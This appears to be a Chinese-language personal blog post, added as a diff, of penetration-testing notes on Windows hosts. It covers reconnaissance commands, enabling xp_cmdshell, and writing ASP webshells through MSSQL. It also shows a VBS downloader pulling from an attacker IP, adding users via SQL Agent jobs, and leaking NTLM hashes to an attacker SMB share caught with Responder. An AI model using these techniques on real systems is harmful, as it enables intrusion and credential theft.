@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="MS-Sql,信息收集,pass the hash,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
+<meta name="keywords" content="MS-Sql,信息收集,pass the hash">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pentesting test in windows">
+<meta property="og:url" content="https://exexute.github.io/2019/04/22/windows内网渗透思路/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://exexute.github.io/2019/04/22/windows内网渗透思路/alwaysinstallelasted_gpedit.png">
+<meta property="og:image" content="https://exexute.github.io/2019/04/22/windows内网渗透思路/alwaysinstallelasted_regedit.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:12.663Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pentesting test in windows">
+<meta name="twitter:description" content="简介最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集 本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.">
+<meta name="twitter:image" content="https://exexute.github.io/2019/04/22/windows内网渗透思路/alwaysinstallelasted_gpedit.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/04/22/windows内网渗透思路/">
+
+
+
+
+
+  <title>Pentesting test in windows | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/04/22/windows内网渗透思路/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Pentesting test in windows</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T22:20:59+08:00">
+                2019-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>最近开始接触windows内网渗透相关的知识, 暂定路线是单主机渗透提权、域渗透; 本文记录windows的信息收集</p>
+<p>本文整理搜集到的windows内网渗透相关的一些知识, 后续将这些知识进行沉淀.</p>
+<a id="more"></a>
+<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
+<li>信息收集</li>
+<li>服务利用</li>
+<li>权限提升</li>
+</ul>
+<blockquote>
+<p>零、信息收集</p>
+</blockquote>
+<p><strong>1.系统信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">$ systeminfo|findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">"OS 版本"</span></span><br><span class="line">$ systeminfo|findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">"OS Version"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cpu_type</span></span><br><span class="line">$ <span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure></p>
+<p><strong>2.网络信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查路由表</span></span><br><span class="line">$ route <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查arp缓存</span></span><br><span class="line">$ arp -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查防火墙规则</span></span><br><span class="line">$ netstat -ano</span><br><span class="line">$ netsh firewall show config</span><br><span class="line">$ netsh firewall show state</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">**3.应用程序及服务**</span><br><span class="line">```bash</span><br><span class="line"><span class="comment"># 查计划任务</span></span><br><span class="line">$ schtasks /QUERY /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查服务进程ID</span></span><br><span class="line">$ tasklist /svc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查安装的驱动</span></span><br><span class="line">$ driverquery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的程序和版本信息</span></span><br><span class="line">$ wmic product list brief</span><br><span class="line">$ wmic process list brief</span><br><span class="line">$ wmic startup list brief</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看.msi程序的执行权限</span></span><br><span class="line">$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否有setuid和setgid</span></span><br><span class="line">$ reg query HKEY_Local_Machine\System\CurrentControlSet\Services\NfsSvr\Parameters\SafeSetUidGidBits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装丙丁和时间信息</span></span><br><span class="line">$ wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KBxxxxxxx"</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>4.敏感数据和目录</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找硬编码文件</span></span><br><span class="line">$ <span class="built_in">cd</span> /</span><br><span class="line">$ dir /b/s password.txt</span><br><span class="line">$ dir /b/s config.*</span><br><span class="line">$ findstr /si password *.xml *.ini *.txt</span><br><span class="line">$ find /si login *.xml *.ini *.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找无人值守安装文件</span></span><br><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br></pre></td></tr></table></figure></p>
+<p><strong>5.文件系统</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python执行os命令</span></span><br><span class="line">$ import os; os.system(<span class="string">"cmd /c &#123;command here&#125;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件是否可写</span></span><br><span class="line">$ dir /a-r<span class="_">-d</span> /s /b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用copy con命令创建ftp会话</span></span><br><span class="line">$ copy con ftp.bat</span><br><span class="line">ftp <span class="comment"># 输入执行会话名称，按回车到下一行，之后按CTRL+Z结束编辑，再按回车退出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件上传脚本</span></span><br><span class="line">downloadfile.vbs </span><br><span class="line"></span><br><span class="line"><span class="comment">#Set your settings</span></span><br><span class="line">strFileURL = <span class="string">"http://&#123;YOUR_IP&#125;/&#123;FILE_NAME.EXT&#125;"</span></span><br><span class="line">strHDLocation = <span class="string">"c:\\&#123;FILE_NAME.EXT&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Fetch the file</span></span><br><span class="line">Set objXMLHTTP = CreateObject(<span class="string">"MSXML2.XMLHTTP"</span>)</span><br><span class="line">objXMLHTTP.open <span class="string">"GET"</span>, strFileURL, <span class="literal">false</span></span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status = 200 Then</span><br><span class="line">Set objADOStream = CreateObject(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type = 1 <span class="string">'adTypeBinary</span></span><br><span class="line"><span class="string">objADOStream.Write objXMLHTTP.ResponseBody</span></span><br><span class="line"><span class="string">objADOStream.Position = 0 '</span>Set the stream position to the start</span><br><span class="line">Set objFSO = Createobject(<span class="string">"Scriptin</span></span><br><span class="line"><span class="string"># 未完..</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>一、服务利用</p>
+</blockquote>
+<ul>
+<li>0x10 MsSql</li>
+<li>0x11 SMB</li>
+</ul>
+<p>本小节将持续更新…</p>
+<h3 id="0x10-MsSql-Escalate-Privilege"><a href="#0x10-MsSql-Escalate-Privilege" class="headerlink" title="0x10 MsSql Escalate Privilege"></a>0x10 MsSql Escalate Privilege</h3><p>进入数据库后, 考虑从数据库中搜集信息、读数据库服务器上的操作系统文件进行信息收集、写文件插入WEB木马或覆盖计划任务、执行操作系统命令收集信息、利用存储过程与UNC获取NTLM Hash进行横向渗透等。<br>MsSql目前为止最新版本为2017。</p>
+<blockquote>
+<p>预备知识</p>
+<ol>
+<li>SqlServer自带默认数据库：master、tempdb、model、msdb，还有两个实例数据库：Northwind、pubs</li>
+<li>数据库登陆方式分为windows用户认证和数据库用户认证</li>
+<li>数据库文件后缀为mdf, 如：msdb.mdf; 日志文件后缀为ldf, 如：msdb.ldf</li>
+<li>只有在sysadmin权限下才可以使用存储过程xp_cmdshell; mssql 2000中, xp_cmdshell默认开启; mssql 2005及以上, 存储过程xp_cmdshell默认禁用; </li>
+</ol>
+</blockquote>
+<h4 id="MsSql基本操作"><a href="#MsSql基本操作" class="headerlink" title="MsSql基本操作"></a>MsSql基本操作</h4><p><strong>1.xp_cmdshell开启与关闭</strong><br>MsSql执行操作系统命令主要依赖于xp_cmdshell存储过程, 在MsSql 2005及以上的数据库中xp_cmdshell默认被禁用, 所以需要掌握开启xp_cmdshell的语法;<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--开启xp_cmdshell</span></span><br><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1</span></span><br><span class="line"><span class="string">RECONFIGURE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXEC sp_configure '</span>xp_cmdshell<span class="string">',1</span></span><br><span class="line"><span class="string">RECONFIGURE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--关闭xp_cmdshell</span></span><br><span class="line"><span class="string">EXEC sp_configure '</span><span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1</span></span><br><span class="line"><span class="string">RECONFIGURE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EXEC sp_configure '</span>xp_cmdshell<span class="string">',0</span></span><br><span class="line"><span class="string">RECONFIGURE</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>2. 数据搜索</strong><br>mssql数据搜索的内容互联网上已经有一份完整的cheat-sheet, 参考cheatsheet: <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank" rel="noopener">mssql-sql-injection-cheat-sheet</a>即可完成这些工作.</p>
+<p><strong>3. 操作文件系统</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--读文件到数据表然后查看</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mydata (line <span class="built_in">varchar</span>(<span class="number">8000</span>));</span><br><span class="line">BULK <span class="keyword">INSERT</span> mydata <span class="keyword">FROM</span> ‘c:boot.ini’;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> mydata;</span><br><span class="line"></span><br><span class="line"><span class="comment">--sp_makewebtask写文件到服务器</span></span><br><span class="line">exec sp_makewebtask 'c:\www\testwr.asp','<span class="keyword">select</span><span class="string">''</span>&lt;%<span class="keyword">execute</span>(request(<span class="string">"SB"</span>))%&gt;<span class="string">''</span> <span class="string">'</span></span><br><span class="line"><span class="string">exec sp_makewebtask '</span>c:\www\testwri.asp<span class="string">','</span><span class="keyword">select</span><span class="string">''</span>&lt;%<span class="keyword">execute</span>(request(<span class="string">"SB"</span>))%&gt;<span class="string">''</span> <span class="string">'</span></span><br><span class="line"><span class="string">--xp_cmdshell写文件</span></span><br><span class="line"><span class="string">exec master..xp_cmdshell '</span>echo ^&lt;%eval request(<span class="string">"pass"</span>)%^&gt; &gt;c:\www\update.asp<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--xp_subdirs查看目录(只有目录没有文件)</span></span><br><span class="line"><span class="string">exec master.dbo.xp_subdirs '</span>c:\www\<span class="string">';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--xp_dirtree查看目录和文件</span></span><br><span class="line"><span class="string">EXEC master.sys.xp_dirtree ‘\\10.10.10.154\myshare’</span></span><br></pre></td></tr></table></figure>
+<p><strong>4. 执行操作系统命令</strong><br>xp_cmdshell存储过程是执行操作系统命令的首选, 它依赖于xplog70.dll, 如果xp_cmdshell被禁用且xplog70.dll文件被删除, 则考虑利用其它方式执行操作系统命令, 如job。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell ‘net user’;</span><br></pre></td></tr></table></figure></p>
+<p><strong>5. 限制条件下的渗透测试</strong></p>
+<p><strong>当删除xp_cmdshell并删除必要的DLL时，如何执行OS命令</strong><br>1.xplog70.dll文件存在<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方式一</span></span><br><span class="line">EXEC sp_addextendedproc 'xp_cmdshell','xplog70.dll'</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 方式二</span></span><br><span class="line">EXEC sp_addextendedproc xp_cmdshell,'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'</span><br></pre></td></tr></table></figure></p>
+<p>2.xplog70.dll文件不存在<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--通过操作系统的job执行操作系统的命令</span></span><br><span class="line"><span class="keyword">DECLARE</span> @jobID uniqueidentifier, @cmdvarchar(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">--定义要执行的操作系统命令</span></span><br><span class="line"><span class="keyword">SET</span> @cmd = <span class="string">'net user SpiderLabs TW-SPL5562/ADD'</span></span><br><span class="line"></span><br><span class="line">EXEC msdb.dbo.sp_add_job @job_name =<span class="string">'_tmp_MakeDirectory'</span>, @enabled = <span class="number">1</span>,@start_step_id = <span class="number">1</span>, @owner_login_name=<span class="string">'sa'</span>, @job_id = @jobID <span class="keyword">OUTPUT</span></span><br><span class="line">EXEC msdb.dbo.sp_add_jobstep @job_id = @jobID,@step_name = <span class="string">'Create Backup Folder'</span>, @step_id = <span class="number">1</span>, @subsystem = <span class="string">'CMDEXEC'</span>,@command = @cmd</span><br><span class="line">EXEC msdb.dbo.sp_add_jobserver @job_id = @jobID</span><br><span class="line">EXEC msdb.dbo.sp_start_job @job_id = @jobID,@output_flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">WAITFOR DELAY <span class="string">'000:00:05'</span> </span><br><span class="line"><span class="keyword">IF</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> msdb.dbo.sysjobsWHERE <span class="keyword">name</span> = <span class="string">'_tmp_MakeDirectory'</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">EXECmsdb.dbo.sp_delete_job @job_name = <span class="string">'_tmp_MakeDirectory'</span></span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"><span class="keyword">go</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>xp_makewebtask存储过程开启</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure 'Web Assistant Procedures', 1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure></p>
+<p><strong>6. xp_dirtree、xp_fileexit提权</strong><br>进入数据库后, 在服务器上打开远程文件将运行MsSql服务账号的NTLM哈希值发送到远程主机, 这是因为windows机器在打开UNC文件时会直接发送NTLM哈希值进行认证, 所以打开UNC时NTLM哈希会直接发送到远程主机445端口上, 在445端口监听并接收即可。<br>MsSql中可以通过<code>xp_DirTree</code>、<code>xp_fileexit</code>、<code>xp_cmdshell</code>等方式打开远程共享文件使服务器发送NTLM哈希值, 通过impacket的mssqlserver或Responder或自定义的SMB服务器等在攻击机器上开启SMB Server接收NTLM哈希值。拿到windows账号后, 开始进行提权windows提权。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发送NTLM Hash</span></span><br><span class="line">EXEC Master.dbo.xp_DirTree <span class="string">"\\&lt;ip&gt;\&lt;share&gt;"</span>;</span><br><span class="line"></span><br><span class="line">EXEC Master.dbo.xp_fileexit <span class="string">"\\&lt;ip&gt;\&lt;share&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收NTLM Hash</span></span><br><span class="line">$ smbserver.py -smb2support myshare /tmp</span><br><span class="line"></span><br><span class="line">$ responder -I eth0</span><br></pre></td></tr></table></figure></p>
+<p>攻击者接收到的NTLM Hash打印在shell的输出中, 格式为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssql-svc::QUERIER:41414********141:32c3771953aadd26********d4bd9ab6:0101000000000000002b51864207********19aa772e88b200000000010010005a0054006d0076007a0053004a006e00030010005a0054006d0076007a0053004a006e000200100047006d00570059004300780071007a000400100047006d00570059004300780071007a0007000800002b51864207d501060004000200000008003000300000000000000000000000003000009d0b4c505ba7e636ef96e2fd65ccaa49b274f02c869919f6be981402eeb5b4900a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310031003100000000000000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>其中, mssql-svc为用户名, QUERIER为MsSql所在机器的主机名, 后面的三段为NTLM Hash.</p>
+<p>拿到NTLM Hash后, 开始进行一些列的横向渗透, 考虑爆破NTLM Hash值、用NTLM Hash登陆MsSql、SMB等.<br>关于如何利用NTLM Hash进行横向渗透的内容, 请参考<a href="https://www.hacklikeapornstar.com/all-pth-techniques/" target="_blank" rel="noopener">path-to-hash</a>及其他互联网内容.</p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478" target="_blank" rel="noopener">how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478</a><br><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/" target="_blank" rel="noopener">wendels-small-hacking-tricks-microsoft-sql-server-edition</a><br><a href="https://www.cnblogs.com/ichunqiu/p/7249516.html" target="_blank" rel="noopener">详述MSSQL服务在渗透测试中的利用</a><br><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder</a><br><a href="https://medium.com/ethical-hacking-blog/mssql-connectivity-with-sqsh-debec7188104" target="_blank" rel="noopener">mssql-client: sqsh</a><br><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" target="_blank" rel="noopener">攻击mssql的存储过程</a><br><a href="https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/" target="_blank" rel="noopener">llmnr-nbtns-poisoning-using-responder</a></p>
+<!--
+### 0x11 SMB
+Server Message Block是WIndows下的一个协议，
+-->
+<blockquote>
+<p>二、权限提升</p>
+</blockquote>
+<p>Windows单机下通用的提权方法为:</p>
+<ul>
+<li>0x20 内核</li>
+<li>0x21 服务</li>
+<li>0x22 dll</li>
+<li>0x23 注册表</li>
+<li>0x24 计划任务</li>
+<li>0x25 文件</li>
+<li>0x26 错误配置</li>
+</ul>
+<h3 id="0x20-内核"><a href="#0x20-内核" class="headerlink" title="0x20 内核"></a>0x20 内核</h3><p>Windows爆出过很多的本地提权漏洞，通过搜集exploit-db上的本地提权poc和对应的漏洞编号及补丁号再结合powershell script查看已打的补丁号就可以找到可利用本地提权漏洞，该部分的内容重在收集。<br>关于这部分内容，已经有前人总结并形成脚本，可自行在github上搜索。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找已打的补丁号</span></span><br><span class="line">$ wmic qfe get Caption,Description,HotFixID,InstalldOn</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x21-服务"><a href="#0x21-服务" class="headerlink" title="0x21 服务"></a>0x21 服务</h3><p>Windows下的服务常见的安全风险为：服务路径带空格且安装路径未用双引号闭合、不安全的服务权限</p>
